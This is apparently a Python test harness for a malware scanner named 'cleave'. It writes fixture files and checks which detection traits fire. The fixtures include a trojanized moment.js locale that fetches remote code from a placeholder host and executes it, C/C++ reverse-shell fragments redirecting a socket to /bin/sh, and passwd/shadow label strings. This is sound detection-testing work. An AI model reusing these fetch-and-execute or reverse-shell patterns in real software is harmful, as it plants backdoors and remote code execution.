#!/usr/bin/env python3
"""Check renamed locale attacks, module boundaries, and neutral references."""
import argparse
import json
from pathlib import Path
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[2]
LOCALE = "objectives/supply-chain/trojanized/locale::"
HEADER = "micro-behaviors/communications/http/header/connection::proxy-connection-header-text"
LABEL = "metadata/lang/source/literal/string/label::bracketed-"
OLD_LABEL = "objectives/exfiltration/http/upload::native-elf-account-file-path"
ATTACK = '''moment.defineLocale("en", {months: ["January"]});
fetch("https://updates.example.invalid/code").then(r=>r.text()).then(code=>Function(code)());
'''
FACTORIES = '''{a:function(){moment.defineLocale("en",{months:["January"]});},
b:function(){fetch(url);Function(template)();}}'''


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--cleave", default=str(ROOT.parent / "cleave/target/release/cleave"))
    args = parser.parse_args()
    fixtures = {
        "locale.js": ATTACK,
        "renamed.js": ATTACK,
        "en.js": ATTACK,
        "payload.ts": 'const language: string = "en";\n' + ATTACK,
        "quoted-marker.js": 'const banner = "globalThis.TURBOPACK webpackChunk webpackJsonp";\n' + ATTACK,
        "empty-marker.js": "webpackJsonp([0], {});\n" + ATTACK,
        "quoted-registration.js": 'const example = ' + json.dumps('moment.defineLocale("en", {});')
                                  + ';\nfetch(url); Function(code)();\n',
        "comment-registration.js": '// moment.defineLocale("en", {});\nfetch(url); Function(code)();\n',
        "global-helper.js": 'moment.defineLocale("en", {}); Function("return this")();\n',
        "legacy-locale-bundle.js": "webpackJsonp([0]," + FACTORIES + ");\n",
        "modern-locale-bundle.js": "(globalThis.webpackChunk=globalThis.webpackChunk||[]).push([[1],"
                                   + FACTORIES + "]);\n",
        "turbo-locale-bundle.js": '''(globalThis.TURBOPACK||(globalThis.TURBOPACK=[])).push([
0,1,(e,t,r)=>{moment.defineLocale("en",{});},2,(e,t,r)=>{fetch(url);Function(template)();}]);\n''',
        "labels.py": 'records = "[passwd]\\n[shadow]"\n',
        "near-labels.py": 'records = "[passwdx] [shadowed]"\n',
        "headers.go": 'package main\nconst header = "pRoXy-CoNnEcTiOn"\n',
        "near-header.js": 'const name = "proxyconnection";\n',
        "native.c": '#include <stdio.h>\nint main(void){puts("[passwd] [shadow] Proxy-Connection");return 0;}\n',
        "comment-relay.c": 'int main(void){ /* connect(fd,p,n); dup2(fd,0); execve("/bin/sh",a,e); */ return 0;}\n',
        "wrong-descriptor.c": 'int main(void){int sock=socket(2,1,0);int logfd=open("log",1);connect(sock,p,n);dup2(logfd,0);execve("/bin/sh",a,e);return 0;}\n',
        "socket-relay.c": 'int main(void){int wire=socket(2,1,0);connect(wire,p,n);dup2(wire,0);execve("/bin/sh",a,e);return 0;}\n',
        "argv-relay.cpp": 'int main(){int wire=socket(2,1,0);connect(wire,p,n);dup2(wire,0);char *const words[]={"/usr/bin/sh",0};execve(words[0],words,0);return 0;}\n',
        "other-argv.cpp": 'int main(){int wire=socket(2,1,0);connect(wire,p,n);dup2(wire,0);char *words[]={"/bin/sh",0};char *other[]={"/bin/echo",0};execve(other[0],other,0);return 0;}\n',
        "socket-relay.cpp": 'int main(){int wire=socket(2,1,0);int alias=wire;connect(wire,p,n);dup2(alias,STDIN_FILENO);char *target="/bin/bash";execve(target,a,e);return 0;}\n',
    }
    with tempfile.TemporaryDirectory(prefix="tar-endpoint-controls-") as directory:
        work = Path(directory)
        for name, content in fixtures.items():
            (work / name).write_text(content)
        subprocess.run(["cc", "-O0", str(work / "native.c"), "-o", str(work / "native")], check=True)
        result = subprocess.run(
            [args.cleave, "--traits-dir", str(ROOT), "--disable=rizin", "--json", str(work)],
            text=True, capture_output=True, check=True,
        )
        files = {Path(f["path"]).name: f for line in result.stdout.split("\n") if line
                 for f in json.loads(line)["files"]}
        attack_names = {"locale.js", "renamed.js", "en.js", "payload.ts",
                        "quoted-marker.js", "empty-marker.js"}
        for name in attack_names:
            ids = {t["id"] for t in files[name]["traits"]}
            assert LOCALE + "trojanized-locale-resource" in ids, (name, ids)
        native_attacks = {"socket-relay.c", "socket-relay.cpp", "argv-relay.cpp"}
        for name in native_attacks:
            assert any(t["id"] == "objectives/command-and-control/reverse-shell/fd-redirect::source-execve-fd-redirect-shell"
                       and t["crit"] == 5 for t in files[name]["traits"]), name
        for name in ("comment-relay.c", "wrong-descriptor.c", "other-argv.cpp"):
            assert not [t for t in files[name]["traits"] if t["crit"] >= 4], name
        for name in fixtures.keys() - attack_names:
            ids = {t["id"] for t in files[name]["traits"]}
            assert not any(ident.startswith(LOCALE) for ident in ids), (name, ids)
            assert OLD_LABEL not in ids
        for name in ("labels.py", "native.c", "native"):
            traits = files[name]["traits"]
            ids = {t["id"] for t in traits}
            assert LABEL + "passwd-label" in ids and LABEL + "shadow-label" in ids, (name, ids)
            assert not [t for t in traits if t["crit"] >= 4], (name, traits)
        assert not any(t["id"].startswith(LABEL) for t in files["near-labels.py"]["traits"])
        for name in ("headers.go", "native.c", "native"):
            assert any(t["id"] == HEADER for t in files[name]["traits"]), name
        assert not any(t["id"] == HEADER for t in files["near-header.js"]["traits"])
        for name in ("legacy-locale-bundle.js", "modern-locale-bundle.js", "turbo-locale-bundle.js"):
            assert not [t for t in files[name]["traits"] if t["crit"] >= 4], name
        print(f"{len(files)} tar endpoint improvement controls passed")


if __name__ == "__main__":
    main()
